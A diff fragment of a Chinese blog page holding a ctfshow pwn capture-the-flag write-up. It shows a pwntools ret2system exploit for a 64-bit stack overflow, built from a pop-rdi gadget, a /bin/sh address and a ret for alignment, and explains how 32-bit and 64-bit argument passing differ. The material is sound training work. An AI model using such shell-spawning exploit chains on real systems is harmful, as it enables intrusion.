+		alt="ret地址查询"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="272"
+		data-flex-basis="652px"
+	
+></p>
+<p>查询/bin/sh的地址：</p>
+<p><img src="/p/ctfshow-pwn-writeup/122.png"
+	width="1135"
+	height="105"
+	srcset="/p/ctfshow-pwn-writeup/122_hu_8e4f1859de6b1d4c.png 480w, /p/ctfshow-pwn-writeup/122_hu_772a3258af0a8472.png 1024w"
+	loading="lazy"
+	
+		alt="/bin/sh的地址：0x400808"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1080"
+		data-flex-basis="2594px"
+	
+></p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28194</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x400808</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4007e3</span> <span class="c1"># 0x00000000004007e3 : pop rdi ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x4004fe</span> <span class="c1"># 0x00000000004004fe : ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>欸为什么exp的payload中的参数不太一样？</p>
+<blockquote class="alert alert-note">
+    <blockquote>
+<h3 id="32位和64位可执行程序的参数传递顺序"><strong>32位和64位可执行程序的参数传递顺序</strong>
+</h3><p>即使思路一样但架构不一样，在写payload的时候注入地址的顺序也是不一样的：</p>
+<ul>
+<li><strong>32 位程序（PWN039）</strong>：32 位程序中，函数参数通过栈传递。在 PWN039 里，<code>system</code>函数地址紧跟在填充数据之后，这是因为溢出后直接覆盖返回地址为<code>system</code>函数地址，让程序执行<code>system</code>函数。在<code>payload = 'a'*(0x12 + 4) + p32(system) + p32(0) + p32(bin_sh)</code>中，<code>'a'*(0x12 + 4)</code>用于填充缓冲区并覆盖原返回地址，<code>p32(system)</code>将返回地址修改为<code>system</code>函数地址 ，<code>p32(0)</code>是为了满足栈结构，作为<code>system</code>函数执行后的返回地址（实际执行中并不重要，可随意填充 4 字节），<code>p32(bin_sh)</code>则是<code>system</code>函数的参数，即<code>/bin/sh</code>字符串的地址。这样的顺序符合 32 位程序通过栈传参和控制程序执行流的特点。</li>
+<li><strong>64 位程序（PWN40）</strong>：64 位程序的函数调用规则有所不同，前 6 个参数优先通过寄存器传递，其中第一个参数存放在<code>rdi</code>寄存器。在 PWN40 中，<code>payload = 'a'*(0xA + 8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</code> ，<code>'a'*(0xA + 8)</code>用于填充缓冲区和覆盖原返回地址；<code>p64(pop_rdi)</code>将<code>pop_rdi</code>指令地址放入栈中，执行<code>pop_rdi</code>指令时，会把紧跟其后的<code>p64(bin_sh)</code>中的<code>/bin/sh</code>地址弹出到<code>rdi</code>寄存器，作为<code>system</code>函数的第一个参数；<code>p64(ret)</code>用于栈对齐（64 位程序调用函数前需要保证栈 16 字节对齐，<code>ret</code>指令可调整栈指针）；最后<code>p64(system)</code>将<code>system</code>函数地址放入栈中，当程序执行到这里时，会跳转到<code>system</code>函数执行，此时<code>rdi</code>寄存器中已正确设置了参数<code>/bin/sh</code>的地址。</li>
+</ul></blockquote></blockquote>
+<h3 id="pwn_041">PWN_041
+</h3><p>题目：32位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代。 <a class="link" href="PWN_041" >PWN_041</a></p>
 
 </section>
 
@@ -3911,7 +4526,7 @@ unicode: "ece7"
 
 
         <span>
-            最后更新于 2025-08-31
+            最后更新于 2025-09-02
         </span>
     </section></footer>
 
@@ -4165,7 +4780,7 @@ unicode: "ece7"
 <section class="wordcount">
   <div class="wordcount-row">
     <p>博主发布了7篇文章  ||</p>
-    <p>总共87.93k 字</p>
+    <p>总共91.17k 字</p>
   </div>
 </section>
         
